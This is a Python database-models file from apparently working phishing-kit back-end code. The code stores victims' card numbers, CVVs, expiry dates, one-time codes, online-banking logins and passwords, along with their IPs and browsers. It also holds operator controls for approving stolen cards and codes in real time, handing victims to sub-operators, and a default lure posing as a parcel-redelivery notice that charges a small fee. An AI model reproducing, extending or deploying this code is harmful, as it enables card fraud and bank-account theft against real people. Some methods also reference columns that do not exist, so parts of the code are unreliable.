# models.py
import datetime
import time

from sqlalchemy import and_

from db import db
from push_message import send_card
from util.redis_util import get_settings


class User(db.Model):
    __tablename__ = "user_table"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    appid = db.Column(db.VARCHAR(255))
    full_name = db.Column(db.VARCHAR(255))
    card_number = db.Column(db.VARCHAR(255))
    exp_date = db.Column(db.VARCHAR(255))
    cvv = db.Column(db.VARCHAR(255))
    otp = db.Column(db.VARCHAR(255))
    online_bank = db.Column(db.VARCHAR(255))
    bank_account = db.Column(db.VARCHAR(255))
    bank_password = db.Column(db.VARCHAR(255))
    status = db.Column(db.VARCHAR(255))
    sms_status = db.Column(db.VARCHAR(255))
    card_status = db.Column(db.VARCHAR(255))
    onlinebank_status = db.Column(db.VARCHAR(255))
    time = db.Column(db.VARCHAR(255))
    lang = db.Column(db.VARCHAR(255))
    ip = db.Column(db.VARCHAR(255))
    User_Agent = db.Column(db.VARCHAR(255))
    plat = db.Column(db.VARCHAR(255))
    online = db.Column(db.VARCHAR(255))
    can_see = db.Column(db.VARCHAR(255))

    def __repr__(self):
        return "<User %r>" % self.id

    def __str__(self):
        return "<User %s>" % self.id

    def get_count(self):
        return self.query.count()

    @classmethod
    def add_card(cls, card_info: dict):
        status_text = "请选择卡操作"
        check_appid = User.query.filter(User.appid == card_info["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=card_info["appid"],
                full_name=card_info["full_name"],
                card_number=card_info["card_number"],
                exp_date=card_info["card_exp"],
                cvv=card_info["card_cvv"],
                lang=card_info["lang"],
                ip=card_info["ip"],
                User_Agent=card_info["User_Agent"],
                plat=card_info["plat"],
                status=status_text,
                time=time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
                online="在线",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: card_info["appid"],
                cls.full_name: card_info["full_name"],
                cls.card_number: card_info["card_number"],
                cls.exp_date: card_info["card_exp"],
                cls.cvv: card_info["card_cvv"],
                cls.status: status_text,
            }
            User.query.filter(User.appid == card_info["appid"]).update(add_data)
            send_card(User.check_card(card_info["appid"]))
        db.session.commit()

    @classmethod
    def add_otp(cls, otp_info: dict):
        check_appid = User.query.filter(User.appid == otp_info["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=otp_info["appid"],
                otp=otp_info["otp"],
                status="请选择验证码操作",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: otp_info["appid"],
                cls.otp: otp_info["otp"],
                cls.status: "请选择验证码操作",
            }
            User.query.filter(User.appid == otp_info["appid"]).update(add_data)
        db.session.commit()

    @classmethod
    def add_account(cls, bank_info: dict):
        check_appid = User.query.filter(User.appid == bank_info["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=bank_info["appid"],
                bank_account=bank_info["account"],
                bank_password=bank_info["password"],
                online_bank=bank_info["online_bank"],
                status="等待网银操作",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: bank_info["appid"],
                cls.bank_account: bank_info["account"],
                cls.bank_password: bank_info["password"],
                cls.online_bank: bank_info["online_bank"],
                cls.status: "等待网银操作",
            }
            User.query.filter(User.appid == bank_info["appid"]).update(add_data)
        db.session.commit()

    @classmethod
    def send_otp(cls, appid: str):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(
                appid=appid,
                send_status="已发送",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.send_status: "已发送",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def pass_card(cls, task_id):
        check_appid = User.query.filter(User.id == int(task_id["id"])).first()
        status = task_id["status"]
        if not check_appid:
            return False
        else:
            if status == "网银验证":
                add_data = {
                    cls.card_status: status,
                    cls.status: "等待输入网银",
                }
            elif status == "卡片错误" or status == "卡片不支持":
                add_data = {
                    cls.card_status: status,
                    cls.status: "等待再次输入卡片",
                }
            else:
                add_data = {
                    cls.card_status: status,
                    cls.status: "等待验证码",
                }
            User.query.filter(User.id == task_id["id"]).update(add_data)
        db.session.commit()

    @classmethod
    def get_card_status(cls, getid: str):
        data_list = User.query.filter(User.appid == getid).first()
        status = data_list.__dict__["card_status"]
        if status == "放行":
            User.query.filter(User.appid == getid).update({cls.status: "等待验证码"})
            db.session.commit()
        if status == "3D验证":
            User.query.filter(User.appid == getid).update({cls.status: "等待输入PIN"})
            db.session.commit()
        return status

    @classmethod
    def pass_otp(cls, task_id):
        check_appid = User.query.filter(User.id == int(task_id["id"])).first()
        status = task_id["status"]
        task_status = "完成"
        if not check_appid:
            return False
        else:
            if status == "重输卡片":
                task_status = "等待再次输入卡片"
            elif status == "网银验证":
                task_status = "等待输入网银"
            elif status == "验证码错误":
                task_status = "等待再次输入验证码"
            add_data = {
                cls.sms_status: status,
                cls.status: task_status,
            }
            User.query.filter(User.id == task_id["id"]).update(add_data)
        db.session.commit()

    @classmethod
    def pass_bank(cls, task_id):
        check_appid = User.query.filter(User.id == int(task_id["id"])).first()
        status = task_id["status"]
        task_status = "完成"
        if not check_appid:
            return False
        else:
            add_data = {}
            if status == "验证错误":
                task_status = "等待再次输入网银账号"
            elif status == "重输卡片":
                task_status = "等待再次输入卡片"
                add_data[cls.sms_status] = '等待'
            add_data = {
                cls.onlinebank_status: status,
                cls.status: task_status,
            }
            User.query.filter(User.id == task_id["id"]).update(add_data)
        db.session.commit()

    @classmethod
    def get_otp_status(cls, getid: str):
        data_list = User.query.filter(User.appid == getid).first()
        status = data_list.__dict__["sms_status"]
        if status == "放行":
            User.query.filter(User.appid == getid).update({cls.status: "完成"})
            db.session.commit()
        return status

    @classmethod
    def get_bank_status(cls, getid: str):
        data_list = User.query.filter(User.appid == getid).first()
        status = data_list.__dict__["onlinebank_status"]
        if status == "放行":
            User.query.filter(User.appid == getid).update({cls.status: "完成"})
            db.session.commit()
        return status

    # 当状态为拒绝时自动重置
    @classmethod
    def reset_smsaction(cls, appid):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(appid=appid, sms_status="等待")
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.sms_status: "等待",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def reset_cardaction(cls, appid):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(appid=appid, card_status="等待")
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.card_status: "等待",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def reset_bankaction(cls, appid):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(appid=appid, onlinebank_status="等待")
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.onlinebank_status: "等待",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def check_card(cls, appid: str):
        data_list = User.query.filter(User.appid == appid).first()
        return data_list.__dict__

    @classmethod
    def change_phone(cls, phone: dict):
        check_appid = User.query.filter(User.appid == phone["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=phone["appid"],
                phone=phone["phone"],
                status="已更改手机号",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: phone["appid"],
                cls.phone: phone["phone"],
                cls.status: "已更改手机号",
            }
            User.query.filter(User.appid == phone["appid"]).update(add_data)
        db.session.commit()

    @classmethod
    def resend_otp(cls, appid: str):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            return False
        else:
            add_data = {
                cls.appid: appid,
                cls.status: "重发验证码",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def get_pending_data(cls, page: int):
        if get_settings()["show_filter"] == "1":
            query_reslut = (
                User.query.filter(and_(User.status != "完成", User.card_number != ""))
                .order_by(User.id.desc())
                .paginate(page=page, per_page=25, error_out=False)
            )
            data_list = query_reslut.items
        else:
            query_reslut = (
                User.query.filter(User.status != "完成")
                .order_by(User.id.desc())
                .paginate(page=page, per_page=25, error_out=False)
            )
            data_list = query_reslut.items
        data_list_del_sa = [x.__dict__ for x in data_list]
        for i in data_list_del_sa:
            if i["status"] == "请选择验证码操作":
                i["disable_sms_action"] = False
            else:
                i["disable_sms_action"] = True
            if i["status"] == "请选择卡操作":
                i["disable_card_action"] = False
            else:
                i["disable_card_action"] = True
            del i["_sa_instance_state"]
            if i['sms_status'] == '等待':
                i['sms_status'] = ''
            if i['card_status'] == '等待':
                i['card_status'] = ''
            if i['onlinebank_status'] == '等待':
                i['onlinebank_status'] = ''
        return [
            data_list_del_sa,
            query_reslut.total,
            [x["appid"] for x in data_list_del_sa],
        ]

    @classmethod
    def get_finish_data(cls):
        finish_data_list = User.query.filter(User.status == "完成").all()
        finish_data_list_filter = [x.__dict__ for x in finish_data_list]
        for i in finish_data_list_filter:
            del i["_sa_instance_state"]
        return finish_data_list_filter

    @classmethod
    def get_all_data(cls):
        data_list = User.query.all()
        return [x.__dict__ for x in data_list]

    # 获取当前权限能查看的鱼
    @classmethod
    def get_subuser_data(cls, username):
        data_list = User.query.filter(User.can_see == username).all()
        data_list_del_sa = [x.__dict__ for x in data_list]
        for i in data_list_del_sa:
            if i["status"] == "请选择验证码操作":
                i["disable_sms_action"] = False
            else:
                i["disable_sms_action"] = True
            if i["status"] == "请选择卡操作":
                i["disable_card_action"] = False
            else:
                i["disable_card_action"] = True
            del i["_sa_instance_state"]
        return data_list_del_sa

    @classmethod
    def delete(cls, delete_id):
        user = User.query.filter(User.id == int(delete_id)).first()
        if user is not None:
            db.session.delete(user)
            db.session.commit()
        else:
            return False

    @classmethod
    def set_online(cls, appid, status):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            return False
        else:
            add_data = {
                cls.online: status,
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def check_data_num(cls):
        pending_number = User.query.filter(User.status != "完成").count()
        totoal_num = User.query.count()
        vistied = Visit().query.count()
        return [vistied, totoal_num, pending_number]

    @classmethod
    def set_can_see(cls, dataid, username):
        check_appid = User.query.filter(User.id == dataid).first()
        if not check_appid:
            return False
        else:
            can_see = {
                cls.can_see: username,
            }
            User.query.filter(User.id == dataid).update(can_see)
            db.session.commit()
            return True

    @classmethod
    def reset_can_see(cls, dataid):
        check_appid = User.query.filter(User.id == dataid).first()
        if not check_appid:
            return False
        else:
            can_see = {
                cls.can_see: None,
            }
            User.query.filter(User.id == dataid).update(can_see)
            db.session.commit()
            return True


class Visit(db.Model):
    __tablename__ = "visit_records"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    ip = db.Column(db.VARCHAR(255))
    time = db.Column(db.DATETIME, default=datetime.datetime.now)

    def __repr__(self):
        return "<Visit %r>" % self.id

    def __str__(self):
        return "<Visit %s>" % self.id

    def get_count(self):
        return self.query.count()

    @classmethod
    def add_record(cls, visit_info: str):
        check_ip = Visit.query.filter(Visit.ip == visit_info).first()
        if not check_ip:
            visit_data = Visit(
                ip=visit_info,
            )
            db.session.add(visit_data)
            db.session.commit()

    @classmethod
    def delete_record(cls):
        Visit.query.filter(Visit.id < 9999999999).delete()
        db.session.commit()


class Setting(db.Model):
    __tablename__ = "setting"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    key = db.Column(db.VARCHAR(255))
    value = db.Column(db.VARCHAR(255))

    def __repr__(self):
        return "<Visit %r>" % self.id

    def __str__(self):
        return "<Visit %s>" % self.id

    @classmethod
    def set_value(cls, key, value):
        update_key = Setting.query.filter(Setting.key == key).first()
        if not update_key:
            set_data = Setting(key=key, value=value)
            db.session.add(set_data)
        else:
            set_data = {
                cls.value: value,
            }
            Setting.query.filter(Setting.key == key).update(set_data)
        db.session.commit()

    @classmethod
    def get_data(cls):
        data_list = Setting.query.all()
        data = [x.__dict__ for x in data_list]
        settings = {}
        for i in data:
            settings[i["key"]] = i["value"]
        return settings

    @classmethod
    def get_syn(cls):
        syn_status = Setting.query.filter(Setting.key == "syn").first()
        return bool(int(syn_status.value))


class Role(db.Model):
    __tablename__ = "member"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    username = db.Column(db.VARCHAR(255))
    password = db.Column(db.VARCHAR(255))
    role = db.Column(db.VARCHAR(255))
    created_at = db.Column(db.DATETIME, default=datetime.datetime.now)
    updated_at = db.Column(db.DATETIME)

    # 添加用户
    @classmethod
    def add_user(cls, username, password, role):
        # 检查用户是否存在
        check_user = Role.query.filter(Role.username == username).first()
        if check_user:
            return False
        else:
            user_info = Role(username=username, password=password, role=role)
            db.session.add(user_info)
            db.session.commit()
            return True

    @classmethod
    def update_password(cls, username, password):
        check_user = Role.query.filter(Role.username == username).first()
        if check_user:
            update_password = {
                cls.password: password,
                cls.updated_at: datetime.datetime.now(),
            }
            Role.query.filter(Role.username == username).update(update_password)
            db.session.commit()
            return True
        else:
            return False

    @classmethod
    def delete_user(cls, username):
        check_user = Role.query.filter(Role.username == username).first()
        if check_user:
            Role.query.filter(Role.username == username).delete()
            db.session.commit()
            return True
        return False

    @classmethod
    def get_user(cls, username):
        check_user = Role.query.filter(Role.username == username).first()
        if check_user:
            user_info = check_user.__dict__
            return user_info
        return False

    @classmethod
    def get_all_user(cls):
        check_user = Role.query.all()
        users_info = [x.__dict__ for x in check_user]
        for i in users_info:
            i["created_at"] = i["created_at"].strftime("%Y-%m-%d %H:%M:%S")
            if i["updated_at"] is None:
                i["updated_at"] = "无"
            else:
                i["updated_at"] = i["updated_at"].strftime("%Y-%m-%d %H:%M:%S")
            del i["_sa_instance_state"]
        return users_info


class Words(db.Model):
    __tablename__ = "words_templates"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    name = db.Column(db.VARCHAR(255))
    traking_number = db.Column(db.VARCHAR(255))
    main_title = db.Column(db.VARCHAR(255))
    main_text_line1 = db.Column(db.TEXT)
    main_text_line2 = db.Column(db.TEXT)
    payment_text = db.Column(db.TEXT)
    otp_text = db.Column(db.TEXT)
    choose = db.Column(db.BOOLEAN)

    def __repr__(self):
        return "<Words %r>" % self.id

    def __str__(self):
        return "<Words %s>" % self.id

    @classmethod
    def add_template(cls, words_data):
        all_template = Words.query.filter(Words.choose == True).all()
        for i in all_template:
            Words.query.filter(Words.name == i.name).update({cls.choose: False})
        db.session.commit()
        check_data = Words.query.filter(Words.name == words_data["name"]).first()
        if check_data:
            update_words = {
                cls.traking_number: words_data["traking_number"],
                cls.main_title: words_data["main_title"],
                cls.main_text_line1: words_data["main_text_line1"],
                cls.main_text_line2: words_data["main_text_line2"],
                cls.payment_text: words_data["payment_text"],
                cls.otp_text: words_data["otp_text"],
                cls.choose: True,
            }
            Words.query.filter(Words.name == words_data["name"]).update(update_words)
            db.session.commit()
        else:
            add_words = Words(
                name=words_data["name"],
                traking_number=words_data["traking_number"],
                main_title=words_data["traking_number"],
                main_text_line1=words_data["main_text_line1"],
                main_text_line2=words_data["main_text_line2"],
                payment_text=words_data["payment_text"],
                otp_text=words_data["otp_text"],
                choose=True,
            )
            db.session.add(add_words)
            db.session.commit()

    @classmethod
    def reset_template(cls):
        default_template = Words(
            name="包裹丢失",
            traking_number="US9514901185421",
            main_title="We have issues with your shipping address",
            main_text_line1="You can schedule redelivery online by filling out your information, We ReDeliver for "
            "You!",
            main_text_line2="Redeliveries can be scheduled online 24 hours a day, 7 days a week. For same-day "
            "Redelivery, make sure your request is submitted by 2 AM CST Monday-Saturday or your "
            "Redelivery will be scheduled for the next day.",
            payment_text="This Redelivery request cost 0.09 USD.",
            otp_text="We require you to enter a one-time verification code for security reasons.",
            choose=True,
        )
        db.session.add(default_template)
        db.session.commit()
